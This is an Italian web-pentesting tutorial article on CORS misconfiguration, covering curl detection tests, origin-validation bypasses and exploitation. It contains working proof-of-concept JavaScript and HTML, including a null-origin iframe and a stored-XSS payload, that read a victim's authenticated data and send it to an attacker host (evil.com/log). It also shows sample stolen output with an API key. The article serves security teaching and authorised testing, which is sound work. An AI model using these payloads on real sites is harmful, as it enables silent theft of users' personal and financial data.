---
title: 'CORS Misconfiguration: Cos’è e Come Trovar'
slug: cors-misconfiguration
description: 'Scopri cos’è una CORS misconfiguration e come individuarla nel pentesting web: origin reflection, null origin, bypass e data theft via CORS.'
draft: true
date: 2026-03-14T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - api
---

**CORS** (Cross-Origin Resource Sharing) è il meccanismo che controlla quali domini possono leggere le risposte di un'applicazione web. Per default, il browser blocca le request JavaScript cross-origin: se sei su `evil.com`, il tuo JavaScript non può leggere le risposte di `target.com`. CORS rilassa questa restrizione con header specifici.

Una **CORS Misconfiguration** si verifica quando il server configura questi header in modo troppo permissivo — accettando qualsiasi Origin, riflettendo l'Origin dell'attaccante, o fidandosi di domini che non dovrebbe. Il risultato: JavaScript su `evil.com` può leggere dati autenticati da `target.com` — profili, email, dati finanziari, token API — usando il cookie della vittima. È un data theft silenzioso: la vittima visita una pagina, il suo browser fa il lavoro sporco in background.

Satellite della [guida pillar API & Modern Web Attacks](https://hackita.it/articoli/api-modern-web-attacks-guida-completa). Vedi anche: [CSRF](https://hackita.it/articoli/csrf), [XSS](https://hackita.it/articoli/xss).

Riferimenti: [PortSwigger CORS](https://portswigger.net/web-security/cors), [OWASP CORS Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing), [HackTricks CORS](https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html).

***

## Come Funziona CORS — In 30 Secondi

```
1. JavaScript su evil.com fa: fetch("https://target.com/api/me", {credentials:"include"})
2. Il browser aggiunge: Origin: https://evil.com
3. Il server risponde con:
   Access-Control-Allow-Origin: https://evil.com    ← chi può leggere?
   Access-Control-Allow-Credentials: true            ← con cookie?
4. Se entrambi sono presenti → evil.com legge la risposta con i cookie della vittima

IL PUNTO CRITICO:
Se il server riflette QUALSIASI Origin → qualsiasi sito legge i tuoi dati autenticati.
```

***

## Detection — 3 Test Con curl (60 Secondi)

```bash
# === Test 1: Origin reflection ===
curl -s -I "https://target.com/api/me" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=VALID"

# Cerca nella response:
# Access-Control-Allow-Origin: https://evil.com       ← RIFLETTE!
# Access-Control-Allow-Credentials: true               ← CON COOKIE!
# Se entrambi → VULNERABILE. PoC immediato.

# === Test 2: null origin ===
curl -s -I "https://target.com/api/me" \
  -H "Origin: null" \
  -H "Cookie: session=VALID"

# Access-Control-Allow-Origin: null → VULNERABILE
# (null origin si ottiene da iframe sandboxed → sfruttabile)

# === Test 3: subdomain/regex bypass ===
curl -s -I "https://target.com/api/me" \
  -H "Origin: https://evil-target.com"
# Se riflette "evil-target.com" → la regex controlla solo "contiene target.com"

curl -s -I "https://target.com/api/me" \
  -H "Origin: https://target.com.evil.com"
# Se riflette → la regex controlla solo "inizia con target.com"
```

### Tutti I Bypass Da Testare

```bash
# Il server usa una regex o whitelist per validare l'Origin.
# Queste regex sono quasi sempre bypassabili:

# Contiene il dominio:
Origin: https://evil-target.com         # "target.com" è nella stringa
Origin: https://target.com.evil.com     # Subdomain dell'attaccante

# Prefisso corretto ma suffisso sbagliato:
Origin: https://target.com.evil.com     # target.com + .evil.com
Origin: https://target.company.com      # target.com + pany.com

# Subdomain wildcard (se il server accetta *.target.com):
Origin: https://anything.target.com     # OK se hai una XSS su un subdomain
# XSS su blog.target.com → diventa l'Origin per leggere dati da api.target.com

# Null:
Origin: null                             # Da iframe sandbox

# Protocollo diverso:
Origin: http://target.com               # HTTP invece di HTTPS

# Porta:
Origin: https://target.com:8080         # Porta diversa
```

***

## Exploitation — PoC JavaScript

Se la detection conferma la vulnerabilità, il PoC è semplice:

### Origin Reflection → Data Theft

```html
<!-- evil.com/steal.html — la vittima visita questa pagina -->
<script>
fetch("https://target.com/api/me", {
  credentials: "include"  // Invia i cookie della vittima!
})
.then(r => r.json())
.then(data => {
  // Invia i dati al server dell'attaccante
  fetch("https://evil.com/log", {
    method: "POST",
    body: JSON.stringify(data)
  });
  console.log("Stolen:", data);
});
</script>

<!--
La vittima:
1. È autenticata su target.com (ha il cookie)
2. Visita evil.com/steal.html
3. Il suo browser fa fetch a target.com/api/me CON il suo cookie
4. Il server risponde con ACAO: https://evil.com + ACAC: true
5. evil.com legge la risposta: nome, email, token, dati sensibili
6. evil.com invia il tutto all'attaccante
7. La vittima non ha visto nulla
-->
```

### Null Origin (Da iframe sandbox)

```html
<!-- Se il server accetta Origin: null -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="
  <script>
    fetch('https://target.com/api/me', {credentials:'include'})
    .then(r => r.json())
    .then(d => {
      // parent non accessibile da sandbox → invia al server
      new Image().src = 'https://evil.com/log?data=' + btoa(JSON.stringify(d));
    });
  </script>
"></iframe>
<!-- L'iframe sandbox ha Origin: null → il server accetta → data theft -->
```

### Subdomain XSS + CORS (La Chain Più Comune)

```bash
# Scenario:
# - target.com CORS accetta *.target.com
# - blog.target.com ha una XSS stored

# Step 1: XSS stored su blog.target.com:
<script>
fetch("https://api.target.com/api/users/me", {credentials:"include"})
.then(r=>r.json())
.then(d=>new Image().src="https://evil.com/log?d="+btoa(JSON.stringify(d)))
</script>

# Step 2: Il browser ha Origin: https://blog.target.com
# Step 3: api.target.com accetta *.target.com → risponde con i dati
# Step 4: La XSS su blog.target.com legge i dati da api.target.com → li invia all'attaccante

# Questa chain è la ragione per cui XSS su qualsiasi subdomain è pericolosa
# anche se quel subdomain non ha dati sensibili
```

***

## Output Reale

### Detection

```bash
$ curl -sI "https://target.com/api/v2/users/me" \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer eyJhbG..."

HTTP/2 200
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
content-type: application/json

# → Origin riflesso + credentials true = VULNERABILE
```

### Data Theft

```bash
# Sul server dell'attaccante (log di /log):
$ cat access.log | tail -1

POST /log HTTP/1.1
Body: {"id":1337,"name":"Marco Rossi","email":"marco@company.com",
"role":"admin","api_key":"sk_live_4eC39HqLyjWDarjtT1zdp7dc",
"phone":"+39 338 7654321","address":"Via Roma 42, Milano"}

# → Dati completi dell'utente autenticato, inclusa API key Stripe!
```

***

## Workflow Operativo

### Step 1 → Test ogni endpoint sensibile

```bash
# Per ogni endpoint che restituisce dati autenticati:
# /api/me, /api/users/me, /api/profile, /api/account
# Invia Origin: https://evil.com → controlla ACAO + ACAC
```

### Step 2 → Se riflette → PoC

```bash
# Crea steal.html → servilo → documenta il data theft
```

### Step 3 → Se non riflette → bypass

```bash
# Testa: null, subdomain, regex bypass, protocollo
# Se *.target.com è accettato → cerca XSS su qualsiasi subdomain
```

### Step 4 → Documenta l'impatto

```bash
# Quali dati sono leggibili? (PII, token, API key, dati finanziari)
# L'attaccante ha bisogno che la vittima visiti una pagina → social engineering
# Ma il PoC è completamente silenzioso — nessun popup, nessun redirect
```

***

## Enterprise Escalation

### CORS Reflection → API Key Theft → Cloud

```
Vittima admin visita evil.com → CORS theft → api_key Stripe
→ Accesso al pannello Stripe → transazioni, rimborsi, dati carte
→ FINANCIAL DATA BREACH
```

### Subdomain XSS + CORS → Mass Data Theft

```
XSS stored su blog.target.com → inviata via link a 500 dipendenti
→ Ogni dipendente che visita → i suoi dati vengono estratti da api.target.com
→ 500 profili con email, telefono, ruolo, token
→ MASS DATA THEFT
```

***

## Caso Studio

**Settore:** Fintech italiana, API REST, 80.000 utenti.

L'endpoint `GET /api/v2/users/me` restituiva profilo completo (nome, email, IBAN, API key) e rifletteva qualsiasi Origin con `Access-Control-Allow-Credentials: true`. PoC: pagina HTML con fetch + credentials:include → dati completi dell'utente rubati in silenzio.

Il campo `api_key` nella response permetteva operazioni sul conto (visualizzazione saldo, storico movimenti) senza ulteriore autenticazione. Un attaccante con un link di phishing e questa CORS misconfiguration poteva leggere IBAN e storico transazioni di qualsiasi utente che cliccava il link.

**Un header sbagliato → dati finanziari di 80.000 utenti esposti.**

***

## ✅ Checklist CORS

```
DETECTION
☐ Origin: https://evil.com → riflesso in ACAO?
☐ ACAC (Allow-Credentials): true presente?
☐ Origin: null → riflesso?

BYPASS
☐ Origin: https://evil-target.com → riflesso? (regex "contiene")
☐ Origin: https://target.com.evil.com → riflesso? (subdomain)
☐ Origin: http://target.com → riflesso? (protocollo diverso)
☐ *.target.com accettato? → cerca XSS su subdomain

POC
☐ PoC HTML con fetch + credentials:include creato
☐ Data theft confermato (dati autenticati letti cross-origin)
☐ Se null origin → PoC con iframe sandbox

IMPATTO
☐ Quali dati sono leggibili? (PII, token, API key, financial)
☐ L'endpoint /api/me restituisce dati sensibili?
☐ Token/API key nella response → escalation possibile?
```

***

Riferimenti: [PortSwigger CORS](https://portswigger.net/web-security/cors), [OWASP CORS Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing), [HackTricks CORS](https://book.hacktricks.wiki/en/pentesting-web/cors-bypass.html).

Satellite della [Guida API & Modern Web Attacks](https://hackita.it/articoli/api-modern-web-attacks-guida-completa). Vedi anche: [CSRF](https://hackita.it/articoli/csrf), [XSS](https://hackita.it/articoli/xss), [Session Hijacking](https://hackita.it/articoli/session-hijacking).

> Vuoi migliorare davvero nel **web pentesting**? Per approfondire metodologie, detection ed exploitation in ambienti autorizzati, trovi la [formazione 1:1 HackIta](https://hackita.it/formazione). Se vuoi testare il tuo **sito web**, la tua **applicazione** o la tua **azienda**, puoi vedere i [servizi HackIta](https://hackita.it/servizi). Se vuoi supportare il progetto e aiutare la crescita di HackIta, puoi farlo su [Supporta HackIta](https://hackita.it/supporta). Per approfondire il tema: [PortSwigger Web Security Academy](https://portswigger.net/web-security),
